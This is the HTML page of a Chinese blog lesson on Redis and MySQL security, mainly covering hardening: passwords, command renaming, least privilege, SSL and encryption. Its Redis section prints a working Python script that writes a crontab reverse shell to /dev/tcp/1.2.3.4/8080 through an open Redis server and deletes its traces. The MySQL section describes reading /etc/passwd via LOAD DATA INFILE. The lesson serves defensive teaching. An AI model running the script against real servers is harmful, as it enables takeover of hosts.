@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.zhaolq.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"androidstudio","dark":"androidstudio"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="说到数据库，你肯定会说：“数据库是我最熟悉的工具了。利用它，我能够设计复杂的表结构、写出炫酷的SQL语句、优化高并发场景下的读写性能。”当然，我们的日常工作离不开数据库的使用。而且，数据库中储存的大量机密信息，对于公司和用户都至关重要。 那关于数据库的安全你知道多少呢？你知道数据库是如何进行认证的吗？使用数据库交换数据的过程是安全的吗？假如黑客连入了数据库，又会发生什么呢？ 今天，我就以两种比较常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？">
+<meta property="og:url" content="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/index.html">
+<meta property="og:site_name" content="洋蔥">
+<meta property="og:description" content="说到数据库，你肯定会说：“数据库是我最熟悉的工具了。利用它，我能够设计复杂的表结构、写出炫酷的SQL语句、优化高并发场景下的读写性能。”当然，我们的日常工作离不开数据库的使用。而且，数据库中储存的大量机密信息，对于公司和用户都至关重要。 那关于数据库的安全你知道多少呢？你知道数据库是如何进行认证的吗？使用数据库交换数据的过程是安全的吗？假如黑客连入了数据库，又会发生什么呢？ 今天，我就以两种比较常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/20200817122807533.png">
+<meta property="og:image" content="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/20200817123006966.png">
+<meta property="article:published_time" content="2023-09-16T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-09-16T00:00:00.000Z">
+<meta property="article:author" content="zhaolq">
+<meta property="article:tag" content="安全攻防技能30讲">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/20200817122807533.png">
+
+
+<link rel="canonical" href="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/","path":"article/2023/09/16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？/","title":"16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？ | 洋蔥</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">洋蔥</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">耳不闻人是非，目不视人之短，口不言人之过。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis%E5%AE%89%E5%85%A8"><span class="nav-number">1.</span> <span class="nav-text">Redis安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL%E5%AE%89%E5%85%A8"><span class="nav-number">2.</span> <span class="nav-text">MySQL安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%9D%E8%80%83%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">思考题</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zhaolq"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">zhaolq</p>
+  <div class="site-description" itemprop="description">有用、有趣、有情义！</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">555</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hellozhaolq" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hellozhaolq" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:hello.zhaolq@qq.com" title="E-Mail → mailto:hello.zhaolq@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.zhaolq.com/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="zhaolq">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="洋蔥">
+      <meta itemprop="description" content="有用、有趣、有情义！">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？ | 洋蔥">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          16Linux系统和应用安全-数据库安全：数据库中的数据是如何被黑客拖取的？
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-09-16 08:00:00" itemprop="dateCreated datePublished" datetime="2023-09-16T08:00:00+08:00">2023-09-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/" itemprop="url" rel="index"><span itemprop="name">安全攻防技能30讲</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>说到数据库，你肯定会说：“数据库是我最熟悉的工具了。利用它，我能够设计复杂的表结构、写出炫酷的SQL语句、优化高并发场景下的读写性能。”当然，我们的日常工作离不开数据库的使用。而且，数据库中储存的大量机密信息，对于公司和用户都至关重要。</p>
+<p>那关于数据库的安全你知道多少呢？你知道数据库是如何进行认证的吗？使用数据库交换数据的过程是安全的吗？假如黑客连入了数据库，又会发生什么呢？</p>
+<p>今天，我就以两种比较常见的数据库Redis和MySQL为例，来和你一起探讨数据库的安全。</p>
+<span id="more"></span>
+
+<h1 id="Redis安全"><a href="#Redis安全" class="headerlink" title="Redis安全"></a>Redis安全</h1><p>我们首先来看Redis。我们都知道，Redis是一个高性能的KV结构的数据库。Redis的设计初衷是在可信的环境中，提供高性能的数据库服务。因此，Redis在设计上没有过多地考虑安全性，甚至可以说它刻意地牺牲了一定的安全性，来获取更高的性能。</p>
+<p>那在安全性不高的情况下，黑客连入Redis能做什么呢？最直接的，黑客能够任意修改Redis中的数据。比如，通过一个简单FLUSHALL命令，黑客就能够清空整个Redis的数据了。</p>
+<p>复杂一些的，黑客还可以发起权限提升，通过Redis在服务器上执行命令，从而控制整个服务器。但是，Redis本身不提供执行命令的功能，那么黑客是如何让Redis执行命令的呢？我们一起来看一下具体的代码流程。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r = redis.Redis(<span class="attribute">host</span>=10.0.0.1, <span class="attribute">port</span>=6379, <span class="attribute">db</span>=0, <span class="attribute">socket_timeout</span>=10)</span><br><span class="line">payload = <span class="string">&#x27;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/8080 0&gt;&amp;1\n\n&#x27;</span></span><br><span class="line">path = <span class="string">&#x27;/var/spool/cron&#x27;</span></span><br><span class="line">name = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;payload&#x27;</span></span><br><span class="line">r.<span class="built_in">set</span>(key, payload)</span><br><span class="line">r.config_set(<span class="string">&#x27;dir&#x27;</span>, path)</span><br><span class="line">r.config_set(<span class="string">&#x27;dbfilename&#x27;</span>, name)</span><br><span class="line">r.save()</span><br><span class="line">r.delete(key)  # 清除痕迹</span><br><span class="line">r.config_set(<span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>针对这个过程，我来详细解释一下，你可以结合代码来看。</p>
+<ul>
+<li>黑客连入Redis。</li>
+<li>黑客写入一个任意的Key，对应的Value是想要执行的命令，并按照Crontab的格式进行拼接。代码如下：</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="regexp">/1* * * * /</span>bin<span class="regexp">/bash -i &gt;&amp; /</span>dev<span class="regexp">/tcp/</span><span class="number">1.2</span>.<span class="number">3.4</span>/<span class="number">80800</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>黑客调用config_set方法，就是通过Redis的CONFIG命令，将Redis数据持久化的目录修改成&#x2F;var&#x2F;spool&#x2F;cron。</li>
+<li>黑客调用save方法，通过Redis的SAVE命令，发起Redis的数据持久化功能。最终，Redis将数据写入到&#x2F;var&#x2F;spool&#x2F;cron中。写入的文件效果如下：</li>
+</ul>
+<p><img src="/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/20200817122807533.png" alt="img"></p>
+<ul>
+<li>Crontab对于无法解析的数据会直接跳过，因此，开头和结尾的乱码不会影响Crontab的执行。最终，Crontab会执行到Value中对应的命令。</li>
+</ul>
+<p>这样一来，黑客就“聪明”地利用Redis保存文件的功能，修改了Crontab，然后利用Crontab执行了命令。</p>
+<p>那么，我们该如何对Redis进行安全防护呢？这里就需要提到我们前面讲过的“黄金法则”和“最小权限原则”了。</p>
+<p>首先，从认证上来说，Redis提供了最简单的密码认证功能。在Redis的配置文件中，只要增加一行requirepass 123456，我们就能够为Redis设置一个密码了。但是，这里有两点需要你注意。</p>
+<ul>
+<li>Redis的性能很高，理论上黑客能够以每秒几十万次的速度来暴力猜测密码。因此，你必须设置一个足够强的密码。我比较推荐随机生成一个32位的“数字加字母”的密码。而且Redis的密码直接保存在配置文件当中，你并不需要记忆它，需要的时候直接查看就好了。</li>
+<li>Redis是为了高性能而设计的。之所以Redis默认不配置密码，就是因为密码会影响性能。按照我之前的测试，加上密码之后，Redis的整体性能会下降20%左右。这也是很多开发和运维，明明知道Redis有安全风险，仍然保持无密码状态的原因。所以，是否给Redis设置密码，还需要你根据实际的情况进行权衡。</li>
+</ul>
+<p>其次是进行授权。尽管Redis本身不提供授权机制，但是我们仍然可以通过“重命名”来间接地实现授权功能。我们可以在Redis的配置文件中加入rename-command CONFIG pUVEYEvdaGH2eAHmNFcDh8Qf9vOej4Ho，就可以将CONFIG功能的关键词，变成一个随机的字符串，黑客不知道这个字符串，就无法执行CONFIG功能了。而且，你仍然可以通过新的命令，来正常地使用CONFIG功能，不会对你的正常操作产生任何影响。</p>
+<p>现在，你应该已经知道在认证和授权上，我们能使用的防护手段了。那在审计上，因为Redis只提供了基本的日志功能（日志等级分为：Debug、Verbose、Notice和Warning），实用信息不多，也就没有太多的应用价值。</p>
+<p>除了认证和授权，如果你还想要对Redis中的数据进行加密，那你只能够在客户端中去集成相应的功能，因为Redis本身不提供任何加密的功能和服务。</p>
+<p>最后，我们还要避免使用ROOT权限去启动Redis，这就需要用到“最小权限原则”了。在前面命令执行的例子中，黑客是通过Redis的保存功能，将命令“写入Crontab”来实现的命令执行功能。而“写入Crontab”这个操作，其实是需要ROOT权限的。因此，我们以一个低权限的用户（比如nobody）身份来启动Redis，就能够降低黑客连入Redis带来的影响了。当然，Redis本身也需要保存日志和持久化数据，所以，它仍然需要写入日志文件的权限（小于ROOT权限）来保证正常运行。</p>
+<p>总结来说，Redis是一个极度看重性能的数据库，为了性能舍弃掉了部分的安全功能。我们可以通过“增加密码”“使用最小权限原则”和“授权”的方式，在一定程度上提升Redis的安全性。但是，这些防护手段更多的是一种缓解机制，为了保证安全性，我们最好是只在可信的网络中使用Redis。</p>
+<h1 id="MySQL安全"><a href="#MySQL安全" class="headerlink" title="MySQL安全"></a>MySQL安全</h1><p>讲到这里，你现在应该也能总结出，黑客攻击数据库的主要方式，除了执行各种命令对数据库中的数据进行“增删改查”，就是在连入数据库后，通过各种手段实现命令执行，最终控制整个服务器。</p>
+<p>那在MySQL中，黑客的攻击方式又有什么不同呢？</p>
+<p>因为MySQL的功能十分强大，自身就提供了和本地文件交互的功能。所以，通过LOAD DATA INFILE，MySQL可以读取服务器的本地文件；通过SELECT … INTO DUMPFILE，MySQL也能够将数据写入到本地文件中。因此，在黑客连入MySQL之后，通过读文件的功能，黑客就能够对服务器的任意文件进行读取，比如敏感的&#x2F;etc&#x2F;passwd或者应用的源代码等；通过写文件的功能，则可以仿照Redis修改Crontab的原理，实现命令执行的功能。</p>
+<p>相比于Redis，MySQL是一个比较成熟的数据库工具，自身的安全性就很高，所以通过正确地配置MySQL的安全选项，我们就能够获得较高的安全保障。</p>
+<p>那么，MySQL在黄金法则和加密上，分别提供了哪些功能呢？</p>
+<p>MySQL提供了多用户的认证体系，它将用户的相关信息（认证信息、权限信息）都存储在了mysql.user这个系统表中。利用这个系统表，MySQL可以通过增删改查操作，来定义和管理用户的认证信息、权限列表等。</p>
+<p>除此之外，在认证上，MySQL还提供了比较完善的密码管理功能，它们分别是：</p>
+<ul>
+<li>密码过期，强制用户定期修改密码；</li>
+<li>密码重用限制，避免用户使用旧的密码；</li>
+<li>密码强度评估，强制用户使用强密码；</li>
+<li>密码失败保护，当用户出现太多密码错误的尝试后锁定账户。</li>
+</ul>
+<p>那么，通过这些密码管理的机制，你就能够拥有一个相对安全的认证体系了。</p>
+<p>在多用户的认证体系中，授权是必不可少的。那MySQL中的授权机制是怎样的呢？</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> db.<span class="keyword">table</span> <span class="keyword">TO</span> <span class="keyword">user</span>@&quot;127.0.0.1&quot; IDENTIFIED <span class="keyword">BY</span> &quot;password&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们通过修改权限的GRANT命令来具体分析一下，MySQL授权机制中的主体、客体和请求。</p>
+<ul>
+<li>主体（user@“127.0.0.1” IDENTIFIED BY “password”）：MySQL的主体是通过用户名、IP和密码这三个信息组合起来进行标记的。</li>
+<li>客体（db.table）：MySQL的客体是数据库和表。</li>
+<li>请求（ALL PRIVILEGES）：MySQL将请求的类型定义成了特权（PRIVILEGES）。常见的特权有INSERT、DELETE等增删改查操作（如果你想要了解其他更细粒度的特权，可以在<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html">官方文档</a>中进行查看）。</li>
+</ul>
+<p>除此之外，MySQL也定义了ROLE的概念，你可以基于这个功能，去实现role-BAC机制。</p>
+<p>虽然和Redis一样，MySQL本身也不提供审计功能。但是，MySQL可以通过第三方插件，来提供审计的服务。比如McAfee提供的<a target="_blank" rel="noopener" href="https://github.com/mcafee/mysql-audit">mysql-audit</a>以及<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/library/mariadb-audit-plugin-log-settings/">MariaDB Audit Plugin</a>。这些插件能够自动收集必要的MySQL操作信息，并推送到你的ELK等日志集群中，方便你进行持续的审计操作。</p>
+<p>在加密方面，MySQL既提供传输过程中SSL（Security Socket Layer）加密，也提供存储过程中硬盘加密。</p>
+<p>我们首先来看MySQL的SSL加密功能。开启SSL功能，需要在配置文件中配置如下命令：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">ssl-ca</span>=ca.pem</span><br><span class="line"><span class="attr">ssl-cert</span>=server-cert.pem</span><br><span class="line"><span class="attr">ssl-key</span>=server-key.pem</span><br></pre></td></tr></table></figure>
+
+<p>但是，这些配置并不能强制客户端使用SSL连接。想要杜绝全部非安全连接的话，我们可以在配置文件中添加require_secure_transport&#x3D;ON，来进行强制限制。</p>
+<p>接着，我们来看，MySQL中提供的硬盘加密功能。硬盘加密过程主要涉及两个密钥，一个主密钥和一个表密钥。表密钥由MySQL随机生成，通过主密钥进行加密后，存储在表头信息中。因此，每一个表格都拥有不同的密钥。</p>
+<p>MySQL的加密功能是由keyring_file这个插件来提供的。需要注意的是，当keyring_file第一次启动的时候，它会生成一个主密钥文件在当前的系统中。你一定要备份这个密钥文件，因为它一旦丢失，数据库中的全部数据，都将因为无法解密而丢失。</p>
+<p>现在，你应该了解了，MySQL在黄金法则上都提供了哪些功能。接下来，我们再来看“最小权限原则”。</p>
+<p>和Redis一样，MySQL也需要避免以ROOT权限启动。不一样的是，MySQL默认提供了这样的能力，当我们在Linux中通过mysqld来启动MySQL进程的时候，mysqld会自动创建一个具备最小权限的mysql用户，并赋予这个用户对应日志文件的权限，保证MySQL拥有必要的最小权限。</p>
+<p>总之，MySQL是一个非常成熟的数据库工具，它提供了完整的安全功能。通过对认证、授权、审计和加密功能的正确配置，你就能够迅速提升MySQL的整体安全性。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天，我们以Redis和MySQL这两种比较典型的数据库为例，对它们的安全性，以及攻破后能产生的危害进行了分析。在这里，我把安全防护的关键内容总结了一张表格，希望能够帮助你加深理解。</p>
+<p><img src="/article/2023/09/16Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E8%A2%AB%E9%BB%91%E5%AE%A2%E6%8B%96%E5%8F%96%E7%9A%84%EF%BC%9F/20200817123006966.png" alt="img"></p>
+<p>通过对这两种数据库的分析，我们知道，数据库面临的威胁不只存在于数据本身，也会影响到数据库所在的服务器。在数据库本身的安全防护上，我们可以通过对“黄金法则”的运用，在认证、授权、审计和加密方面，为其设置一定的保护能力。同时，为了避免数据库对服务器的衍生影响，我们也应该落实“最小权限原则”， 避免以ROOT权限去启动数据库服务。</p>
+<p>当然，目前成熟的数据库产品肯定不止这两种。但是，我希望通过对这两种数据库的安全分析，让你掌握数据库安全的主要内容，在实际工作中，能够做到活学活用，自主去分析你用到的数据库。</p>
+<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>最后，让我们来看一道思考题。</p>
